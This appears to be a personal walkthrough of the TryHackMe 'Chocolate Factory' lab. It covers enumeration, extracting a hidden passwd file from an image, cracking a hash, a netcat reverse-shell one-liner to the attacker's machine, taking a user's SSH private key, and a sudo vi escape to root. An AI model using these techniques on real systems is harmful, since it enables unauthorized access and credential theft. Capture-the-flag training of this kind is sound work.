# Chocolate Factory (THM)

- https://tryhackme.com/room/chocolatefactory
- March 7, 2023
- easy

---

## Enumeration

### Nmap

- there are many ports open

```
PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 3.0.3
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?    syn-ack
101/tcp open  hostname?   syn-ack
102/tcp open  iso-tsap?   syn-ack
103/tcp open  gppitnp?    syn-ack
104/tcp open  acr-nema?   syn-ack
105/tcp open  csnet-ns?   syn-ack
106/tcp open  pop3pw?     syn-ack
107/tcp open  rtelnet?    syn-ack
108/tcp open  snagas?     syn-ack
109/tcp open  pop2?       syn-ack
110/tcp open  pop3?       syn-ack
111/tcp open  rpcbind?    syn-ack
112/tcp open  mcidas?     syn-ack
113/tcp open  ident?      syn-ack
114/tcp open  audionews?  syn-ack
115/tcp open  sftp?       syn-ack
116/tcp open  ansanotify? syn-ack
117/tcp open  uucp-path?  syn-ack
118/tcp open  sqlserv?    syn-ack
119/tcp open  nntp?       syn-ack
120/tcp open  cfdptkt?    syn-ack
121/tcp open  erpc?       syn-ack
122/tcp open  smakynet?   syn-ack
123/tcp open  ntp?        syn-ack
124/tcp open  ansatrader? syn-ack
125/tcp open  locus-map?  syn-ack
```

- Interesting ports

### 113

```
113/tcp open  ident?     syn-ack
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   DNSVersionBindReqTCP, GenericLines, GetRequest, Help, NULL, SSLSessionReq, TerminalServer:
|_    http://localhost/key_rev_key <- You will find the key here!!!
```

- from this, download the key from

```
wget http://$IP/key_rev_key
```

- then , `strings key_rev_key`

```
Enter your name:
laksdhfas
 congratulations you have found the key:
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safe
Bad name!
;*3$"
```

- `chmod +x key_rev_key` and
- execute `./key_rev_key'
- Enter your name -> `laksdhfas`
- get key (still don't know what for)

### FTP

- enter as anonymous login and get `gum_room.jpg`
- with binwalk, there may be some file hidden
- `stegoveritas gum_room.jpg`
- `steghide_526f90df7038c88b4801de94e84d65b3.bin` extracted
- check file for this, it is ASCII text and open it and found that it is base64 encoded text
- base64 decoded and found that it is passwd file and saved it into passwd
- one interested user

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

- crack with john

```sh
john charile.hash --wordlist=/usr/share/wordlists/rockyou.txt
# cn7824   (charlie)
```

- found password
- enter ssh and it is not ssh password

### HTTP

- directory brute forcing with ffuf
- nothing interesting found
- home page is just login page
- login with above credentials from above
- redirect to a page where code execution can be done

## User Access

- to get reverse shell
- listen with nc and get request to

```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TUN_IP 4242 >/tmp/f
```

- get `www-data` user access
- look around in the machine like suid bits, id, /etc/crontab, /etc/passwd, users under /home
- under `/home/charlie/`

```sh
www-data@chocolate-factory:/home/charlie$ ls -lah
ls -lah
total 40K
drwxr-xr-x 5 charlie charley 4.0K Oct  7  2020 .
drwxr-xr-x 3 root    root    4.0K Oct  1  2020 ..
-rw-r--r-- 1 charlie charley 3.7K Apr  4  2018 .bashrc
drwx------ 2 charlie charley 4.0K Sep  1  2020 .cache
drwx------ 3 charlie charley 4.0K Sep  1  2020 .gnupg
drwxrwxr-x 3 charlie charley 4.0K Sep 29  2020 .local
-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
-rw-r--r-- 1 charlie charley 1.7K Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
www-data@chocolate-factory:/home/charlie$ file *
file *
teleport:     PEM RSA private key
teleport.pub: OpenSSH RSA public key
user.txt:     regular file, no read permission
```

- teleport -> RSA private key
- read teleport and save as id_rsa in local machine
- chmod to 600
- enter as charlie with id_rsa

```sh
charlie@chocolate-factory:/$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

## Root Access

- to get root access

```sh
sudo vi -c ':!/bin/sh' /dev/null
```

- become root
- user flag is straight through to read
- for root flag, copy the root.py file
- print(mess) -> to print the flag
- enter key from above and get the flag

---
